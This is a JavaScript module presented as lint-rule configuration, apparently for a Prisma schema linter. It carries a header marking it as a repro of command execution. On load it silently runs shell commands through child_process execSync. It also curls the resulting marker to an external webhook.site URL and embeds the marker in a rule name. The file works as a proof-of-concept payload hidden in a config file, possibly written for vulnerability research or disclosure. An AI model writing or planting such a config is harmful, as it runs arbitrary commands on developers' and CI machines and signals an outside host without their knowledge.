// EXECCHAIN-01 repro v2: in-band proof of child_process exec (marker = shell command output)
const { execSync } = require("child_process");
let marker = "noexec";
try {
  marker = execSync("printf '%s' \"cmd-$(date +%s | sha256sum | cut -c1-12)\"", { timeout: 8000 }).toString().trim();
} catch (e) {
  marker = "execerr-" + String(e && (e.code || e.message)).replace(/\s+/g, "_").slice(0, 40);
}
try {
  execSync("curl -sS -m 5 -o /dev/null 'https://webhook.site/e90ef1d7-4a15-4283-ab43-101eec0be5d9/prisma2-" + marker + "'", { timeout: 9000 });
} catch (e) {}
module.exports = {
  rules: {
    ["execx-unknown-rule-" + marker]: "error",
    "model-name-grammatical-number": ["error", { style: "singular" }]
  }
};
